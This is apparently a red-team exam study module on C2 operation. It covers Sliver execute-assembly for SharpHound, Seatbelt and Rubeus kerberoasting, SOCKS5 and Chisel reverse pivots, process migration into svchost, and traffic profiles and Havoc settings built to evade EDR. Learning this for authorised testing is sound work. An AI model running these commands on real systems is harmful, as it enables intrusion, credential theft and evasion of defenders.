# Phase 02: C2 Frameworks Deep Dive

> **Why this phase exists**: Basic beacon setup isn't enough. On the exam you need to run post-exploitation tools in memory, set up pivots, manage multiple sessions, and customize traffic. This phase turns you from "C2 user" to "C2 operator."

**Study time**: 1 week
**Difficulty**: Intermediate
**Prerequisite**: Phase 01 complete — you have a working Sliver setup

---

## Learning Objectives

- [ ] Run .NET tools in memory via execute-assembly (no disk write)
- [ ] Set up and use a SOCKS5 proxy through a beacon for network pivoting
- [ ] Migrate a beacon to a different process
- [ ] Customize Sliver's HTTP profile to change traffic patterns
- [ ] Understand how Havoc and Mythic differ from Sliver and when you'd choose each
- [ ] Operate multiple simultaneous sessions

---

## 1. Execute-Assembly — Why In-Memory Matters

### The problem with dropping tools to disk

Dropping `SharpHound.exe` to `C:\Windows\Temp\` and running it generates:
- Sysmon Event 11: FileCreate for SharpHound.exe
- Sysmon Event 1: ProcessCreate for SharpHound.exe
- Static AV scan on the file as it's written
- Defender recognizes "SharpHound.exe" by name and hash

All of this before the tool even runs.

### How execute-assembly solves this

`execute-assembly` takes a .NET binary on your Kali machine, reads it as bytes, sends it over the encrypted C2 channel to the beacon, and the beacon loads and runs it entirely **in memory inside the beacon's own process**. No file is written to disk. The process list shows your beacon process, not SharpHound.

```
Kali: sliver (beacon) > execute-assembly /tools/SharpHound.exe -c All --zip
→ Sliver reads SharpHound.exe as bytes
→ Encrypts them
→ Sends over HTTPS to beacon
→ Beacon calls Assembly.Load(bytes) — .NET loads it in memory
→ SharpHound runs inside beacon's process
→ Output returned over C2
→ Nothing written to disk on the target
```

**This is the correct way to run all post-exploitation tools on the exam.**

### Practice: Run tools via execute-assembly

```bash
# Download tools to your Kali (do this before exam)
# SharpHound
wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe -O ~/tools/SharpHound.exe

# Seatbelt
wget https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe -O ~/tools/Seatbelt.exe

# Rubeus
wget https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe -O ~/tools/Rubeus.exe

# Run them via execute-assembly
sliver (beacon) > execute-assembly ~/tools/Seatbelt.exe -group=all
sliver (beacon) > execute-assembly ~/tools/SharpHound.exe -c All --zip --outputdirectory C:\\Windows\\Temp\\
sliver (beacon) > execute-assembly ~/tools/Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

---

## 2. Pivoting — Why and How

### The problem

In a real network (and possibly in the exam), not every host has direct internet access. The DC might be on a 10.10.10.0/24 segment. Your Kali is on the VPN at 192.168.56.10. You have a beacon on a workstation at 192.168.56.50, which CAN reach the DC at 10.10.10.10. But your Kali cannot reach 10.10.10.10 directly.

```
Kali (192.168.56.10)  ← cannot reach →  DC (10.10.10.10)
                              ↑
              WS01 (192.168.56.50) CAN reach DC
```

### How a SOCKS proxy solves this

You create a SOCKS5 proxy **through your beacon on WS01**. Your Kali tools send traffic to `127.0.0.1:1080`, which is forwarded through the beacon to WS01, which then sends it to the target.

```
Tool on Kali → SOCKS proxy (127.0.0.1:1080) → beacon on WS01 → DC (10.10.10.10)
```

### Setting up Sliver SOCKS5

```bash
# Start SOCKS5 proxy via beacon
sliver (beacon) > socks5 start --host 127.0.0.1 --port 1080

# Configure proxychains
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# Now route any tool through the proxy
proxychains nmap -sT -Pn -p 80,443,445,5985 10.10.10.10
proxychains bloodhound-python -u user -p pass -d domain.local -dc 10.10.10.10 -c All
proxychains evil-winrm -i 10.10.10.10 -u administrator -p Password1
```

### Chisel (when you need a standalone pivot, not via C2)

Sometimes you want a pivot that doesn't depend on your C2 being up.

```bash
# Kali (server mode)
./chisel server -p 8080 --reverse

# Compromised host (client mode — run via C2 shell)
.\chisel.exe client <kali_ip>:8080 R:socks
# This creates a SOCKS5 proxy at 127.0.0.1:1080 on Kali

# Now same proxychains setup
```

**When to use which**:
- Sliver SOCKS5: quick, no extra files on target, use during active C2 session
- Chisel: more stable for long-running pivots, works when C2 is unreachable, but requires dropping a file

---

## 3. Process Migration

### Why migrate processes?

Your beacon runs in a specific process (e.g., `powershell.exe`). Problems:
- If the user closes PowerShell, you lose the session
- Some post-exploitation techniques require running from a specific process type
- A process named `beacon.exe` is suspicious; `svchost.exe` is not

**Process migration** = move your beacon's code into another process.

```bash
# List processes to find a good target
sliver (beacon) > ps

# Migrate to a stable, less suspicious process
# Good targets: svchost.exe, explorer.exe, RuntimeBroker.exe
sliver (beacon) > migrate --pid <target_pid>
```

**What happens technically**: The beacon allocates memory in the target process, writes shellcode to it, and creates a remote thread to execute it. The original beacon exits. You now have a new session from inside the target process.

**Limitations**: Migrating to a process owned by a different user requires SeDebugPrivilege (i.e., SYSTEM). You can't migrate from low-priv into a SYSTEM process.

---

## 4. HTTP Traffic Profiles — Making Your C2 Look Normal

Default Sliver traffic looks like this:
```
GET /sliver/beacon/check-in HTTP/1.1
User-Agent: Go-http-client/1.1
Host: 192.168.56.10
```

This is instantly identifiable as Sliver. A real proxy or EDR will flag it.

A traffic profile changes what the HTTP requests look like. With a good profile:
```
GET /api/v1/health HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: application/json
Host: cdn-images.example.com
```

### Creating a custom profile in Sliver

```json
// /tmp/sliver_profile.json
{
  "implant_config": {
    "poll_jitter": 30,
    "poll_interval": 15,
    "reconnect_interval": 30
  },
  "get_implant_config": {
    "method": "GET",
    "uri": ["/api/v1/health", "/cdn/assets/main.js", "/static/img/logo.png"],
    "headers": [
      {"name": "User-Agent", "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
      {"name": "Accept", "value": "text/html,application/xhtml+xml,*/*;q=0.8"},
      {"name": "Accept-Language", "value": "en-US,en;q=0.9"}
    ]
  }
}
```

**Key settings**:
- `poll_jitter`: randomizes sleep interval (±30% of poll_interval) — makes the periodic check-in pattern less obvious
- `poll_interval`: how often the beacon calls home in seconds
- URIs: rotate through these to look like different page requests

---

## 5. Havoc and Mythic — When Would You Use Them?

### Havoc

Havoc is a newer open-source C2 with a modern UI. Its **Demon** agent uses direct syscalls and indirect syscalls by default — bypassing userland hooks better than Sliver's default.

**Choose Havoc when**: You're in an environment with a mature EDR (CrowdStrike, SentinelOne) that catches default Sliver. Havoc's evasion techniques are more sophisticated out of the box.

```bash
git clone https://github.com/HavocFramework/Havoc
cd Havoc && make
./teamserver server --profile profiles/havoc.yaotl
# Connect with: ./Havoc (GUI client)
```

**Havoc Demon options that matter for evasion**:
- Sleep Technique: WaitForSingleObjectEx (low), Ekko (medium), Foliage (high stealth)
- Indirect Syscalls: ON
- Stack Duplication: ON
- Sleep Obfuscation: ON

### Mythic

Mythic is a framework of frameworks — it has a modular architecture where C2 protocols and agents are separate plugins. More complex to set up, but very flexible.

**Choose Mythic when**: You need a specific agent capability not available in Sliver/Havoc, or you're doing a long-term red team operation and need the agent-profile flexibility.

```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic && sudo ./install_docker_ubuntu.sh
sudo make
# UI at https://localhost:7443
# Install agents: sudo mythic-cli install github https://github.com/MythicAgents/Apollo
```

**For the CRTeamer exam**: Sliver or Havoc is fine. Don't use Mythic unless you're already comfortable with it — the setup overhead is significant under time pressure.

---

## 6. Maintaining Multiple Sessions

In the exam you'll have beacons on multiple hosts. Managing them:

```bash
# List all sessions
sliver > sessions

# Give sessions friendly names
sliver > rename -s <session_id> -n "WKSTN01_SYSTEM"

# Switch between sessions
sliver > use <session_id>
# or
sliver > use WKSTN01_SYSTEM

# Background current session
sliver (WKSTN01) > background

# Run tasks on multiple sessions via aliases
sliver > alias --session WKSTN01_SYSTEM -- "getuid"
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Intro to C2](https://tryhackme.com/room/introtoc2) | THM (Free) | C2 concepts, sessions |
| [THM: Abusing Windows Internals](https://tryhackme.com/room/abusingwindowsinternals) | THM (Sub) | Process injection, migration |
| Manual: Sliver SOCKS5 | Your lab | Set up pivot from WS01 to DC |
| Manual: Execute-assembly drill | Your lab | Run SharpHound, Rubeus, Seatbelt via exec-asm |

---

## Phase 02 Mastery Checklist

- [ ] Can you run SharpHound via execute-assembly and explain why this is better than dropping the file?
- [ ] Can you set up a SOCKS5 proxy via Sliver and route Impacket tools through it?
- [ ] Can you set up a Chisel tunnel independently of your C2?
- [ ] Can you migrate your beacon to a different process and explain what happens technically?
- [ ] Can you explain what a C2 traffic profile changes and why it matters?
- [ ] Can you manage 3+ simultaneous Sliver sessions and switch between them fluently?
- [ ] Can you explain the difference between Sliver, Havoc, and Mythic and when you'd choose each?

---

## Next Phase

→ **Phase 03: Payload Development — How Detection Works** — before you can evade detection, you need to understand exactly what Windows Defender is doing
